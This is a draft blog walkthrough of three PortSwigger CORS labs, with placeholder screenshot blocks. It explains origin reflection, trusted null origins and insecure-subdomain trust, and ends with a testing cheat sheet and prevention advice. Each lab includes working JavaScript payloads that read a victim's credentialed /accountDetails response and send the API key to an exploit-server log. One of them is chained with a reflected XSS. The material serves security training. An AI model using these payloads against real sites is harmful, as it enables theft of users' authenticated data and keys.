---
title: "PortSwigger CORS Labs — Complete Walkthrough"
date: 2026-09-22 07:50:00 +0000
categories: [Web Penetration Testing]
tags: [CORS, PortSwigger, Web Security Academy, Same-Origin Policy]
description: "All 3 PortSwigger CORS labs: basic origin reflection, trusted null origin, and trusted insecure protocols leading to API key theft."
author: Paschal Sangawe
toc: true
---

Cross-Origin Resource Sharing (CORS) is the mechanism that relaxes the browser's Same-Origin Policy so a page can read responses from a *different* origin. Misconfiguration turns that relaxation into a data leak: if a site reflects an attacker-controlled `Origin` and also allows credentials, a malicious page can read the victim's authenticated data.

This post covers all **3 PortSwigger CORS labs**. Each ends with stealing the administrator's API key from `/accountDetails`.

## Background — the two headers that matter

```http
Access-Control-Allow-Origin: <origin>     # which origin may read the response
Access-Control-Allow-Credentials: true    # cookies are sent/readable
```

A dangerous combination is: **`Access-Control-Allow-Origin` reflects an untrusted origin** *and* **`Access-Control-Allow-Credentials: true`**. The browser then lets an attacker's JavaScript issue credentialed requests and read the response.

The baseline data endpoint is always:

```http
GET /accountDetails HTTP/1.1
Cookie: session=<victim>
```

## Lab 1 — CORS vulnerability with basic origin reflection
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Origin: https://example.com`.
> _Save as_ `images/portswigger-cors-labs/1.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/1.png)`_._


**Difficulty:** Apprentice
**Goal:** Read the administrator's API key.

1. Log in and open **My account**. In proxy history, `/accountDetails` returns your API key and carries `Access-Control-Allow-Credentials: true`.
2. Send it to Repeater and add an arbitrary origin:

```http
Origin: https://example.com
```

> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `Origin: https://example.com`.
> _Save as_ `images/portswigger-cors-labs/2.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/2.png)`_._


3. The response reflects it:

```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `Access-Control-Allow-Origin: https://example.com`.
> _Save as_ `images/portswigger-cors-labs/3.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/3.png)`_._


4. Host this on the exploit server:

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
  location='/log?key='+this.responseText;
};
</script>
```

> **Picture goes here (#4).** Capture this step in the decompiler/editor or terminal. Key line: `<script>`.
> _Save as_ `images/portswigger-cors-labs/4.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/4.png)`_._


5. **View exploit** to confirm, then **Deliver exploit to victim**, and read the victim's key from the access log.

**Why it works:** `withCredentials = true` sends the victim's cookies, and because the server reflects the attacker origin with credentials allowed, the browser lets the script read the response.

> **Picture goes here (#5).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-cors-labs/5.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/5.png)`_._

## Lab 2 — CORS vulnerability with trusted null origin
> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`.
> _Save as_ `images/portswigger-cors-labs/6.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/6.png)`_._


**Difficulty:** Apprentice
**Goal:** Same API-key theft, but the server only trusts the literal `null` origin.

Sending `Origin: null` is reflected with credentials allowed. Browsers send `Origin: null` from sandboxed/filed/data contexts, so we create one with an **iframe `sandbox`** and `srcdoc`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
  location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

> **Picture goes here (#7).** Capture this step in the decompiler/editor or terminal. Key line: `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`.
> _Save as_ `images/portswigger-cors-labs/7.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/7.png)`_._


**View exploit**, then **Deliver exploit to victim**, and read the key from the log.

> **Why `null` is dangerous:** it is trivially spoofable and also appears in legitimate edge cases (sandboxed iframes, `file://`, some redirects). Never whitelist it.

> **Picture goes here (#8).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-cors-labs/8.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/8.png)`_._

## Lab 3 — CORS vulnerability with trusted insecure protocols
> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net`.
> _Save as_ `images/portswigger-cors-labs/9.png` _then replace this block with_ `![Lab 3 — CORS vulnerability with trusted insecure protocols](/images/portswigger-cors-labs/9.png)`_._


**Difficulty:** Practitioner
**Goal:** Steal the API key by chaining CORS trust with an XSS on a trusted subdomain.

1. Confirm the server trusts arbitrary **subdomains**, including over plain HTTP:

```http
Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net
```

> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net`.
> _Save as_ `images/portswigger-cors-labs/10.png` _then replace this block with_ `![Lab 3 — CORS vulnerability with trusted insecure protocols](/images/portswigger-cors-labs/10.png)`_._


It is reflected with credentials allowed.
2. Find a product page whose "Check stock" is loaded over **HTTP** on a subdomain, e.g. `http://stock.YOUR-LAB-ID...`, and confirm the `productId` parameter is **XSS-vulnerable**.
3. Because the subdomain is trusted by CORS, JavaScript running there can read `/accountDetails` on the main site. Deliver this to the victim:

```html
<script>
document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

> **Picture goes here (#11).** Capture this step in the decompiler/editor or terminal. Key line: `<script>`.
> _Save as_ `images/portswigger-cors-labs/11.png` _then replace this block with_ `![Lab 3 — CORS vulnerability with trusted insecure protocols](/images/portswigger-cors-labs/11.png)`_._


**View exploit**, then **Deliver exploit to victim**, and read the key from the log.

**Why it works:** the whitelist trusts *all* subdomains regardless of scheme. The HTTP subdomain is MITM-able and contains XSS, giving the attacker script execution on a CORS-trusted origin.

## CORS testing cheat sheet

| Test | Header to send | Look for |
|------|----------------|----------|
| Reflect any origin | `Origin: https://evil.com` | `ACAO: https://evil.com` + `ACAC: true` |
| Null origin | `Origin: null` | `ACAO: null` + `ACAC: true` |
| Prefix/suffix match | `Origin: https://victim.com.evil.com` | Reflected due to regex error |
| Subdomain trust | `Origin: http://sub.victim.com` | Reflected incl. `http://` |
| Wildcard + creds | `Origin: https://evil.com` | `ACAO: *` with `ACAC: true` (browsers reject) |
| Trusted but XSS-able origin | Inject on a whitelisted subdomain | Read credentialed response |

## Prevention

- Do **not** reflect the `Origin` header blindly. Validate against a strict allow-list of trusted origins.
- Never allow-list `null`, and never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.
- Trust only **exact** hosts over HTTPS; do not use loose regexes or trust whole subdomain trees — and never allow plain HTTP origins.
- Remember CORS is a **browser** control, not server-side authorization: sensitive endpoints must still enforce authentication and authorization themselves.

## Related posts

- [WebSocket labs](/posts/portswigger-websockets-labs/)
- [SSRF labs](/posts/portswigger-ssrf-labs/)
- [API Testing labs](/posts/portswigger-api-testing-labs/)
- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)

> **Picture goes here (#12).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-cors-labs/12.png` _then replace this block with_ `![Related posts](/images/portswigger-cors-labs/12.png)`_._
